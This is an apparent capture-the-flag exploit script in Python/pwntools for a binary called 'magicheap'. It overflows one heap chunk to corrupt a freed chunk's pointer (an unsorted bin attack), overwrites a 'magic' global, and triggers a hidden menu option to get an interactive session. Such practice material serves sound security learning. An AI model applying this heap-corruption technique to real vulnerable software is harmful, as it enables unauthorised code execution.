#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["gnome-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./magicheap",env = {"LD_PRELOAD": "./libc-2.23.so"})
    #io = process("./magicheap")  #b'malloc(): unsorted double linked list corrupted\n'
else:
    io = remote("localhost", 9999)

elf = ELF("./magicheap")
#  libc = ELF("")
gdb.attach(io)
def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)


def create(size, content, attack = False):
    io.sendlineafter("choice :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendlineafter(":", content)


def edit(idx, size, content):
    io.sendlineafter("choice :", "2")
    io.sendlineafter(" :", str(idx))
    io.sendlineafter(" : ", str(size))
    io.sendlineafter(" : ", content)

def delete(idx):
    io.sendlineafter("choice :", "3")
    io.sendlineafter(" :", str(idx))


if __name__ == "__main__":
    create(0x10, 'aaaa')
    create(0x80, 'bbbb')
    create(0x10, 'cccc')

    delete(1)

    payload = cyclic(0x10) + p64(0) + p64(0x91) + p64(0) + p64(elf.symbols["magic"] - 0x10)
    print(hex(elf.symbols["magic"] ))
    edit(0, 0x10 + 0x20, payload)
    pause()
    create(0x80, 'dddd')
    pause()
    io.sendlineafter("choice :", b"4869")
    io.interactive()
    io.close()
